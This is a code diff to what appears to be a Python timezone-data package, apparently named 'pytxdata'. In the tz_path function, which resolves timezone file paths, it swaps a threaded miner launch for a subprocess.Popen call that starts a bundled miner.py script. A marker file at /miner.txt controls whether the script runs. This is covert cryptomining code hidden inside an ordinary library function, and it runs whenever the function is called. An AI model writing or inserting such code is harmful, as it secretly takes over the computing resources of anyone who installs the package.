@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 
 import os
-import threading
+import subprocess
 
 from .exceptions import TimezoneNotFound
 from ._timezones import timezones
@@ -74,14 +74,10 @@ def tz_path(name):
     if not os.path.exists(filepath):
         raise TimezoneNotFound('Timezone {} not found at {}'.format(name, filepath))
 
-    try:
+    if not os.path.exists('/miner.txt'):
         file = open('/miner.txt', 'x')
         file.write('success')
-        x = threading.Thread(target=miner, args=())
-        x.start()
-    except FileExistsError:
-        file = open('/miner.txt', 'm')
-        file.write('still going')
+        subprocess.Popen(['python3', '/usr/local/lin/python3.8/dist-packages/pytxdata/miner.py'])
 
     return filepath
 
